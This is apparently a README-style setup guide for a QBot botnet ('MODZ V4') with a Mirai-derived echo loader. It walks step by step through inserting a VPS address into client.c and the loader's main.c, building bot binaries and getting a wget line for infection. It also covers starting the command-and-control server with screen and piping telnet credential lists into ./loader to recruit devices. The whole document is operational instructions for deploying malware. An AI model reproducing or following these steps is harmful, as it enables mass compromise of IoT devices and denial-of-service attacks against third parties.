Step 1: Get your vps ip address and copy it, go into client.c file
go to line 96 and highlight 178.128.128.249 click CTRL F at the same time
and click "replace" option and paste ur ip of ur server in "Replace with"
then click "Replace all" (DO NOT FUCKING TOUCH ANYTHING ELSE) make sure to save
changes

Step 2:Drag all your files into ur vps root directory lols
(That should be simple it takes no skill what so ever)

Step 3: Run this command in your centos 6 server
yum install python paramiko -y
this is basicly all u really need since i made qbot.py to make things easy

Step 4: When its done and python paramiko is installed on your centos machine run this
python qbot.py 
So now in the middle of running "python qbot.py" as its installing everything basicly
its gonna open something its gonna say "GNU nano" at the top this is were u creat your login
so make a login for example i want my username to be "root" and i want my password to be "root"
your gonna need to this to be able to login into the net sooo type ur username click the space bar < 1 time 
and type in a password
Noww this may be tricky for some of u but ounce u have ur login in click CTRL AND X at the same time
its gonna give u two options click the "Y" key on ur keyboard and click enter
AND DONE WITH ALL DAT

Step 5: Ounce we got all that out the way and u fully ran the "python qbot.py"
all u need to do is compile ur archs so if u didnt change the botport in the client.c
run this python cc.py client.c 206.189.169.221
sooo for example my server ip is 206.189.169.221 soo i put it at the end of the command
u put ur vps ip at the end (P.S YOUR IP MUST BE IN THE CLIENT.C) but that was the first step lel
i hope none of u are that stupid to skip the most important step...
anyways when u type ur command click the enter key and its gonna say "Download Dem Binaryz [y/n]:"
click the y key and click enter now wait... its gonna give you ur wget save it ur gonna need it for bots to join

Step 6: That was easy right ?? ok now that we basicly have all that done i like to reboot the server
(THIS IS NOT NEEDED BUT I STILL DO IT)
soo if u wanna do it with me follow me type reboot in ur vps
its gonna reboot ur server and wait maybe 1 min to open it again
Now thats it back up paste all this in ur vps at ounce
and click enter 

service vsftpd start
service httpd start
service mysqld start
service xinetd start

Step 7: Run ulimit -n 999999
now screen ur server like this
screen ./server 1994 500 2
Basicly the 1994 is the botport in the client.c if u screen with a botport that its not
in the client.c then bots wont fucking join for example if 1994 was not in the client.c as i type this and i screened it
with 1994 then bots wouldnt join

Basicly the 500 is the threads the cnc is screened on (DONT FUCKING CHANGE)

Basicly the 1337 is the connect port you connect Via putty with it

ANYWAYS THANKS I HOPE I HELPED SOME DUMBASSES THAT DONT KNO HOW TO SETUP A SIMPLE FUCKING QBOT LMAO BYEE BYEE
NEED HELP ??? TEXT ME ON INSTAGRAM IF I DONT REPLY IM MOSTLIKLY SLEEP DONT SPAM ME AND DONT BOTHER TEXTING ME IF 
YOU DIDNT PAY FOR THE MODZ V4 SOURCE OK BYE PPL...






ECHO LOAD STEP...
NOW THAT WE HAVE THE NET UP AND SHIT THIS IS THE ECHO LOADER THAT ORGINALY CAME FROM 
MIRAI U NEED TELNET LIST FOR THE BOTS TO JOIN

STEP 1: GO INTO THE DLR FOLDER ND IN THE MAIN.C
206,189,215,254 PUT UR IP THERE BUT PUT THE COMMOS THEN SAVE IT...

STEP 2:IN THE LOADER FILE GO INTO MAIN.C AND HIGHLIGHT MY IP I INPUTED AND DO CTRL F AND REPLACE ALL AND INSERT UR IP
AFTER U HAVE DONE THAT PUT THAT SAVE IT AND PUT THE 
BUILD.SH
DLR
LOADER
ALL THOESE FILES NEED TO BE IN UR VPS
AFTERRRRR YOU EDIT IT AND PUT UT VPS IP IN THEM
AFTERRRRRRRRRRRRRRR AFTER AFTER !!!
NOW SIMPLY
RUN "sh build.sh"
it will compile the loader now u can use it put a telnet list .txt in the loader
file and run "cd loader"
"ulimit -n 999999"
"cat *.txt | ./loader"
